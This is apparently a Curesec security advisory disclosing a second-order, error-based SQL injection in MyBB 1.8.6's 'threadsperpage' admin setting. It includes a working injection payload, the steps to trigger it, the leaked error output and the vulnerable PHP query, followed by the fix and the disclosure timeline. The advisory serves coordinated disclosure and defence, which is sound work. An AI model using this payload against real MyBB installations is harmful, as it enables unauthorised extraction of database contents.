@@ -1,0 +1,93 @@
+Security Advisory - Curesec Research Team
+
+1. Introduction
+
+Affected Product:    MyBB 1.8.6
+Fixed in:            1.8.7
+Fixed Version Link:  http://resources.mybb.com/downloads/mybb_1807.zip
+Vendor Website:      http://www.mybb.com/
+Vulnerability Type:  SQL Injection
+Remote Exploitable:  Yes
+Reported to vendor:  01/29/2016
+Disclosed to public: 09/15/2016
+Release mode:        Coordinated Release
+CVE:                 n/a
+Credits              Tim Coen of Curesec GmbH
+
+2. Overview
+
+MyBB is forum software written in PHP. In version 1.8.6, it is vulnerable to a
+second order SQL injection by an authenticated admin user, allowing the
+extraction of data from the database.
+
+3. Details
+
+Description
+
+CVSS: Medium 6.0 AV:N/AC:M/Au:S/C:P/I:P/A:P
+
+The setting threadsperpage is vulnerable to second order error based SQL
+injection. An admin account is needed to change this setting.
+
+The injection takes place into a LIMIT clause, and the query also uses ORDER
+BY, making an injection of UNION ALL not possible, but it is still possibly to
+extract information.
+
+Proof of Concept
+
+Go to the settings page:
+    http://localhost/mybb_1806/Upload/admin/index.php?module=config-settings&action=change&gid=7
+
+For Setting "threadsperpage" use:
+    20 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);
+
+Visit a forum to trigger injected code:
+    http://localhost/mybb_1806/Upload/forumdisplay.php?fid=3
+
+The result will be:
+    SQL Error:
+        1105 - XPATH syntax error: ':5.5.33-1'
+    Query:
+        SELECT t.*, (t.totalratings/t.numratings) AS averagerating, t.username AS threadusername, u.username FROM mybb_threads t LEFT JOIN mybb_users u ON (u.uid = t.uid) WHERE t.fid='3' AND t.visible IN (-1,0,1) ORDER BY t.sticky DESC, t.lastpost desc LIMIT 0, 20 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1); 
+
+Code
+
+forumdisplay.php
+    $perpage = $mybb->settings['threadsperpage'];
+    [...]
+	$query = $db->query("
+		SELECT t.*, {$ratingadd}t.username AS threadusername, u.username
+		FROM ".TABLE_PREFIX."threads t
+		LEFT JOIN ".TABLE_PREFIX."users u ON (u.uid = t.uid)
+		WHERE t.fid='$fid' $tuseronly $tvisibleonly $datecutsql2 $prefixsql2
+		ORDER BY t.sticky DESC, {$t}{$sortfield} $sortordernow $sortfield2
+		LIMIT $start, $perpage
+	");
+
+4. Solution
+
+To mitigate this issue please upgrade at least to version 1.8.7:
+
+http://resources.mybb.com/downloads/mybb_1807.zip
+
+Please note that a newer version might already be available.
+
+5. Report Timeline
+
+01/29/2016 Informed Vendor about Issue
+02/26/2016 Vendor requests more time
+03/11/2016 Vendor releases fix
+09/15/2016 Disclosed to public
+
+
+Blog Reference:
+https://www.curesec.com/blog/article/blog/MyBB-186-SQL-Injection-159.html
+ 
+--
+blog:  https://www.curesec.com/blog
+tweet: https://twitter.com/curesec
+
+Curesec GmbH
+Curesec Research Team
+Josef-Orlopp-Straße 54
+10365 Berlin, Germany
